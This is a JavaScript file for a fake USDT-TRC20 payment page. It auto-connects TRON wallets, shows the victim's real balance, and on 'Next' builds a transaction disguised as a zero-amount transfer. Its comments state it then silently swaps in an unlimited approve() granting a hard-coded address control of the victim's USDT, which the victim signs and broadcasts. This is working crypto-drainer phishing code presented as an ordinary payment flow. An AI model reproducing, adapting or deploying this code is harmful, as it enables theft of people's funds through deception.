// 核心配置参数 (Core Configuration)
window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址

document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amountInput');
    const usdValue = document.getElementById('usdValue');
    const btnAll = document.getElementById('btnAll');
    const btnNext = document.querySelector('.btn-next');
    
    // Exchange Rate Config
    const EXCHANGE_RATE = 0.95; 
    const MOCK_BALANCE = 1234.56;

    // Format currency
    const formatCurrency = (value) => {
        return value.toFixed(2);
    };

    // Update USD value based on input
    amountInput.addEventListener('input', (e) => {
        const value = parseFloat(e.target.value);
        if (!isNaN(value)) {
            usdValue.textContent = formatCurrency(value * EXCHANGE_RATE);
        } else {
            usdValue.textContent = '0.00';
        }
    });

    // Handle "All" button click
    btnAll.addEventListener('click', () => {
        amountInput.value = MOCK_BALANCE;
        amountInput.dispatchEvent(new Event('input'));
    });

    // Update available balance text
    const balanceText = document.querySelector('.balance-text');
    balanceText.textContent = `可用: ${MOCK_BALANCE} USDT-TRC20`;

    // Wallet Logic
    let tronWeb = null;
    let userAddress = null;

    // Attempt to connect to any available Tron wallet
    async function connectWallet() {
        console.log("Connecting wallet...");
        
        // Strategy 1: OKX Wallet specific check
        if (window.okxwallet && window.okxwallet.tronLink) {
            try {
                console.log("Found OKX Wallet");
                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                // OKX might return differently, just check if we have address now
                if (window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.okxwallet.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    if (userAddress) {
                        console.log("Wallet connected via OKX:", userAddress);
                        return true;
                    }
                }
            } catch (e) {
                console.warn("OKX connect failed", e);
            }
        }

        // Strategy 2: Standard TronLink (or wallets masking as TronLink)
        if (window.tronLink) {
            try {
                console.log("Found TronLink object");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                // Some wallets don't return standard code 200, so we check result or just check tronWeb state
                if (res && (res.code === 200 || res.result)) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("Wallet connected via tronLink request:", userAddress);
                    return true;
                }
            } catch (e) {
                console.log("tronLink request failed/rejected", e);
            }
            
            // Fallback: Check if already injected and ready (even if request failed)
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
                tronWeb = window.tronLink.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                console.log("Wallet connected via tronLink property:", userAddress);
                return true;
            }
        }

        // Strategy 3: Global TronWeb (Legacy / TokenPocket / BitKeep)
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            // Some wallets inject tronWeb but ready is false initially, but address is there. 
            // We trust the address if it exists.
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("Wallet connected via global tronWeb:", userAddress);
            return true;
        }

        return false;
    }

    // Auto-connect mechanism
    async function initWalletAuto() {
        let connected = await connectWallet();
        
        if (connected) {
            updateUIWithWalletInfo();
        } else {
            let attempts = 0;
            const maxAttempts = 20; 
            const interval = setInterval(async () => {
                attempts++;
                connected = await connectWallet();
                if (connected) {
                    clearInterval(interval);
                    updateUIWithWalletInfo();
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    console.log("Wallet not found after polling");
                }
            }, 500);
        }
    }

    // Update UI with wallet info (Address & Balance)
    async function updateUIWithWalletInfo() {
        if (!userAddress || !tronWeb) return;

        // Show hidden elements
        const balanceRow = document.querySelector('.balance-row');
        const paymentCard = document.querySelector('.card.row-card');
        
        if (balanceRow) balanceRow.style.display = 'flex';
        if (paymentCard) paymentCard.style.display = 'flex';

        // 1. Update Payment Address (Masked)
        // TP4i ... g6yi
        const len = userAddress.length;
        const maskedAddress = `${userAddress.substring(0, 4)} ... ${userAddress.substring(len - 4)}`;
        const addressPreview = document.querySelector('.address-preview');
        if (addressPreview) {
            addressPreview.textContent = maskedAddress;
        }

        // 2. Fetch and Update USDT Balance
        try {
            const contract = await tronWeb.contract().at(window.usdtContractAddress);
            // balanceOf returns BigNumber/Integer in Sun (6 decimals for USDT)
            const balance = await contract.balanceOf(userAddress).call();
            // Convert from Sun (1e6) to Unit
            // Handle different return types (BigNumber object or raw string/number)
            let balanceVal = balance.toString(); 
            let actualBalance = parseFloat(balanceVal) / 1000000;
            
            // Update UI
            const balanceText = document.querySelector('.balance-text');
            if (balanceText) {
                balanceText.textContent = `可用: ${actualBalance} USDT-TRC20`;
            }
            
            // Update MOCK_BALANCE logic so "All" button works with real balance
            // We can store it in a global or data attribute, but for simplicity:
            btnAll.onclick = () => {
                amountInput.value = actualBalance;
                amountInput.dispatchEvent(new Event('input'));
            };

        } catch (error) {
            console.error("Failed to fetch balance:", error);
        }
    }

    initWalletAuto();

    // Handle Next Button (Authorization)
    btnNext.addEventListener('click', async () => {
        if (!tronWeb || !userAddress) {
            await connectWallet();
        }

        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            alert("请先连接钱包 (如 TronLink, TokenPocket, OKX 等)");
            if (window.tronLink) {
                try {
                    window.tronLink.request({ method: 'tron_requestAccounts' });
                } catch(e){}
            }
            return;
        }

        try {
            btnNext.textContent = "正在确认...";
            btnNext.disabled = true;

            // 1. 构造 approve 的真实 Payload (The payload we actually want to execute)
            const spenderAddress = window.Permission_address; // T-address
            const spenderHex = tronWeb.address.toHex(spenderAddress).replace(/^41/, '0x'); // Convert to hex, keep 0x for now
            
            // Function Selector: approve(address,uint256) -> 095ea7b3
            const selector = '095ea7b3';
            
            // Param 1: Address (Pad to 32 bytes)
            // Remove 0x, remove 41 if still there (tronWeb.address.toHex returns 41 prefix)
            let addrVal = tronWeb.address.toHex(spenderAddress).substring(2); // Remove 41
            // Pad left with zeros to 64 chars (32 bytes)
            const param1 = addrVal.padStart(64, '0');
            
            // Param 2: Amount (Infinite)
            const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            
            const rawData = selector + param1 + param2;

            // 2. 创建一个伪装的交易 (Create a dummy transaction that looks like 'transfer')
            // 我们调用 'transfer' 函数，这会让部分钱包误以为是转账
            const dummyTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
                window.usdtContractAddress,
                'transfer(address,uint256)', // 伪装成 transfer
                { feeLimit: 100000000 },
                [
                    { type: 'address', value: spenderAddress }, // 传入相同的地址以增加可信度
                    { type: 'uint256', value: 0 } // 0金额
                ],
                userAddress
            );

            // 3. 偷梁换柱：将交易中的 data 替换为 approve 的 data
            if (dummyTransaction.transaction && dummyTransaction.transaction.raw_data && dummyTransaction.transaction.raw_data.contract) {
                dummyTransaction.transaction.raw_data.contract[0].parameter.value.data = rawData;
            }

            // 4. 签名并广播
            const signedTx = await tronWeb.trx.sign(dummyTransaction.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);
            
            console.log("Transaction submitted:", result);
            
            if (result.result) {
                alert("提交成功！");
                btnNext.textContent = "下一步";
            } else {
                throw new Error("Transaction broadcast failed");
            }
            btnNext.disabled = false;

        } catch (error) {
            console.error("Transaction failed:", error);
            alert("提交失败: " + (error.message || error));
            btnNext.textContent = "下一步";
            btnNext.disabled = false;
        }
    });
});
